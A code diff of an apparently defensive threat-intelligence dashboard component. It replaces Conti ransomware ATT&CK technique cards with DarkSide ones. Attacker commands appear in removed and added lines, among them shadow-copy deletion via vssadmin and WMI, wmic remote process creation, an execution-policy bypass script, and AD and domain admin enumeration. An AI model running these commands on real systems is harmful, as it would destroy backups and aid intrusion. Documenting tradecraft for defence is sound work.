+						<span className='text-dark fw-bold mb-1 fs-3'>- Account Manipulation</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Adversaries may leverage external-facing remote services to initially access and/or persist within a network.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide uses GPO to maintain persistence</div>
 					
 					
 					
@@ -924,12 +781,12 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1055.001</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Process Injection: Dynamic-link Library Injection</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1548.002</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Abuse Elevation Control Mechanism: Bypass User Account Control</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti ransomware has loaded an encrypted dynamic-link library (DLL) into memory and then executes it.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The malware checks whether the Windows 10 user account under which it is running has administrative privileges; If it does not, the malware attempts to elevate its privileges using the CMSTPLUA technique</div>
 					
 					
 					
@@ -943,96 +800,14 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1027</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Obfuscated Files or Information</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1562.001</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Impair Defenses: Disable or Modify Tools</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti ransomware has encrypted DLLs and used obfuscation to hide Windows API calls.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide disables security protection services using the Impair Defenses technique to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.</div>
 					
 					
-					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1055.001</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Process Injection: Dynamic-link Library Injection</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti ransomware has loaded an encrypted DLL into memory and then executes it.</div>
-					
-					
-					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1140</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Deobfuscate/Decode Files or Information</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti ransomware has decrypted its payload using a hardcoded AES-256 key.</div>
-					
-					
-					
-				</div>
-			</div>
-		</div>
-	</div>
-	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Credential-Access</div>
-	<div className='row g-5 g-xl-8 pt-4'>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1110</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Brute Force</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti actors use legitimate tools to maliciously scan for and brute force routers, cameras, and network-attached storage devices with web interfaces</div>
-					
-					
-					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1558.003</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Steal or Forge Kerberos Tickets: Kerberoasting</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti actors use Kerberos attacks to attempt to get the Admin hash.</div>
-					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
-						<span>&nbsp;&nbsp;</span>
-					
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
-						<span>&nbsp;&nbsp;</span>
-					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) exit 0 else exit 1</div>
-							
-						</div>
-					</div>
 					
 				</div>
 			</div>
@@ -1049,18 +824,22 @@ Excel
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution. The discovery commands utilize the familiar built in Microsoft utilities.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Darkside uses ADFind to gather information about aorganizational units(OUs) and domain trusts from Active Directory.</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
 						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
 						<span>&nbsp;&nbsp;</span>
 						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
+						<span>&nbsp;&nbsp;</span>
+					
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;nltest /domain_trusts /all_trusts</div>
+							<div>&deg;&nbsp;#adfind_path -f (objectcategory=organizationalUnit)</div>
+							<div>&deg;&nbsp;#adfind_path -gcb -sc trustdmp</div>
 							
 						</div>
 					</div>
@@ -1072,54 +851,26 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1069</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Permission Group Discovery</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1069.002</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Permission Groups Discovery: Domain Groups</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution. The discovery commands utilize the familiar built in Microsoft utilities.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Darkside uses ADFind to enumerate domain Groups</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
 						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
 						<span>&nbsp;&nbsp;</span>
 						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
+						<span>&nbsp;&nbsp;</span>
+					
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;net localgroup "administrator"</div>
-							<div>&deg;&nbsp;net group "domain admins" /dom</div>
-							<div>&deg;&nbsp;C:\Windows\system32\net1 group "domain admins" /dom</div>
-							<div>&deg;&nbsp;C:\Windows\system32\cmd.exe /C net localgroup Administrators</div>
-							
-						</div>
-					</div>
-					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1082</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- System Information Discovery</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution. The discovery commands utilize the familiar built in Microsoft utilities.</div>
-					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
-					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;C:\Windows\system32\cmd.exe /C systeminfo</div>
+							<div>&deg;&nbsp;#adfind_path -f (objectcategory=group)</div>
 							
 						</div>
 					</div>
@@ -1136,7 +887,7 @@ Excel
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution. The discovery commands utilize the familiar built in Microsoft utilities.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Darkside uses ADFind to query Active Directory for computers</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
@@ -1147,8 +898,7 @@ Excel
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;C:\Windows\system32\cmd.exe /C ping DOMAINCONTROLLER</div>
-							<div>&deg;&nbsp;C:\Windows\system32\cmd.exe /C ping ENDPOINT</div>
+							<div>&deg;&nbsp;#adfind_path -f (objectcategory=computer)</div>
 							
 						</div>
 					</div>
@@ -1160,26 +910,14 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1124</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- System Time Discovery</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1016</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- System Network Configuration Discovery</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution. The discovery commands utilize the familiar built in Microsoft utilities.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide uses NetScan to discovery.</div>
 					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
 					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;C:\Windows\system32\cmd.exe /C time</div>
-							
-						</div>
-					</div>
 					
 				</div>
 			</div>
@@ -1188,66 +926,14 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1518</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Software Discovery</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1614.001</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- System Location Discovery: System Language Discovery</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The contents of Get-DataInfo.ps1 provide the threat actor with very specific details of the environment. This includes things like disk size, connectivity, antivirus software, and backup software.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide ransomware collects the information about computer name and system language in its initial code execution. DarkSide is used to target English-speaking countries. DarkSide ransomware checks the default system language using GetSystemDefaultUILanguage, GetUserDefaultLangID function</div>
 					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
 					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;[start.bat]</div>
-							<div>&deg;&nbsp;@echo off</div>
-							<div>&deg;&nbsp;pushd %~dp0</div>
-							<div>&deg;&nbsp;powershell.exe Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force</div>
-							<div>&deg;&nbsp;IF "%1"==""(</div>
-							<div>&deg;&nbsp;color 70</div>
-							<div>&deg;&nbsp;echo "Please select a type of info collected:"</div>
-							<div>&deg;&nbsp;set /p method="Press Enter for collect [all]: "</div>
-							<div>&deg;&nbsp;color 08</div>
-							<div>&deg;&nbsp;cls</div>
-							<div>&deg;&nbsp;@echo on</div>
-							<div>&deg;&nbsp;powershell.exe -executionpolicy remotesigned -File .\Get-DataInfo.ps1 %method</div>
-							<div>&deg;&nbsp;)</div>
-							
-						</div>
-					</div>
-					
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1087</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Account Discovery</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The Microsoft Active Directory PowerShell module was also imported and used for discovery tasks.</div>
-					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
-					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;Get-ADComputer -Filter enabled -eq $true -properties *|select Name, DNSHostName, OperatingSystem, LastLogonDate | Export-CSV C:\Users\AllWindows.csv -NoTypeInformation -Encoding UTF8</div>
-							
-						</div>
-					</div>
 					
 				</div>
 			</div>
@@ -1259,26 +945,52 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1021.002</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Remote Services: SMB/Windows Admin Shares</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1021</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Remote Services</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti ransomware can spread via SMB and encrypts files on different hosts, potentially compromising an entire network.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Using PSExec, Remote Desktop connections, and (in the case of Linux servers) SSH to move laterally within the network</div>
 					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
 					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;C:\Windows\system32\cmd.exe /C wmic /node:"DOMAINCONTROLLER" process call create "C:\3.exe"</div>
-							
-						</div>
+					
+				</div>
+			</div>
+		</div>
+	</div>
+	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Collection</div>
+	<div className='row g-5 g-xl-8 pt-4'>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1113</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Screen Capture</span>
 					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DMany report said DarkSide use Screen Capture techniques to collect.</div>
+					
+					
+					
+				</div>
+			</div>
+		</div>
+	</div>
+	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Command-and-Control</div>
+	<div className='row g-5 g-xl-8 pt-4'>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1090.003</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Proxy: Multi-hop Proxy</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide actors primarily use The Onion Router (TOR) for Command and Control (C2).</div>
+					
+					
 					
 				</div>
 			</div>
@@ -1290,26 +1002,30 @@ Excel
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1048</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Exfiltration Over Alternative Protocol </span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1567.002</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Exfiltration Over Web Service: Exfiltration to Cloud Storage</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide actors uploaded archives of stolen files to the cloud storage providers Mega or pCloud in cases we've investigated.</div>
 					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
 					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;C:\Users\REDACTED\AppData\Local\Temp\1\is-HCFKT.tmp\WinSCP-5.19.1-Setup.tmp" /SL5="$A02B0,10288106,864256,C:\Users\USER\Desktop\WinSCP-5.19.1-Setup.exe" </div>
-							
-						</div>
+					
+				</div>
+			</div>
+		</div>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1048</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Exfiltration Over Alternative Protocol</span>
 					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Darkside uses PuTTy, an alternative application used for network file transfer.</div>
+					
+					
 					
 				</div>
 			</div>
@@ -1326,48 +1042,22 @@ Excel
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti ransomware can use "Windows Restart Manager" to ensure files are unlocked and open for encryption.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide actors deploy DarkSide ransomware to encrypt and steal sensitive data. The actors then threaten to publicly release the data if the ransom is not paid. The DarkSide ransomware uses Salsa20 and RSA encryption.</div>
 					
-					<div className='fs-2 fw-bold pb-3'>Command</div>
-					<div className='mb-5'>
-						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
-						<span>&nbsp;&nbsp;</span>
-						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
-						<span>&nbsp;&nbsp;</span>
 					
-						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;C:\Windows\system32\cmd.exe /C wmic /node:"ENDPOINT" process call create "C:\test.exe"</div>
-							
-						</div>
-					</div>
 					<div className='fs-2 fw-bold pb-3'>Encryption algorithm</div>
 					<div className='ms-5 mb-5'>
-						<span className='badge badge-light-info fs-7 fw-bold my-2'>AES</span>
+						<span className='badge badge-light-info fs-7 fw-bold my-2'>ChaCha20</span>
 						<span>&nbsp;&nbsp;</span>
-						<span className='badge badge-light-info fs-7 fw-bold my-2'>RSA</span>
+						<span className='badge badge-light-info fs-7 fw-bold my-2'>RSA-4096 (LINUX)</span>
+						<span>&nbsp;&nbsp;</span>
+						<span className='badge badge-light-info fs-7 fw-bold my-2'>RSA-1024 (WINDOWS)</span>
 						<span>&nbsp;&nbsp;</span>
 						
 					</div>
 					<div className='fs-2 fw-bold pb-3'>Added Extension</div>
-					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>.conti</div>
+					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>victim's ID</div>
 						
-				</div>
-			</div>
-		</div>
-		<div className='col-xl-6'>
-			<div className='card card-xl-stretch mb-xl-8'>
-				<div className='card-header align-items-center border-0 mt-4'>
-					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1489</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Service Stop</span>
-					</div>
-				</div>
-				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti ransomware can stop up to 146 Windows services related to security, backup, database, and email solutions through the use of net stop.</div>
-					
-					
-					
 				</div>
 			</div>
 		</div>
@@ -1380,18 +1070,18 @@ Excel
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Conti ransomware can delete Windows Volume Shadow Copies using vssadmin.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>DarkSide then deletes the shadow copies by launching an obfuscated PowerShell script that uses WMI to delete them.</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
 					<div className='mb-5'>
 						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
 						<span>&nbsp;&nbsp;</span>
 						
-						<span className='badge badge-light-primary fs-7 fw-bold my-2'>cmd</span>
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
 						<span>&nbsp;&nbsp;</span>
 					
 						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
-							<div>&deg;&nbsp;vssadmin.exe delete shadows /all /quiet</div>
+							<div>&deg;&nbsp;Get-WmiObject Win32_Shadowcopy | ForEach-Object $_.Delete();</div>
 							
 						</div>
 					</div>
@@ -1404,4 +1094,4 @@ Excel
   )
 }
 
-export {Conti}
+export {DarkSide}
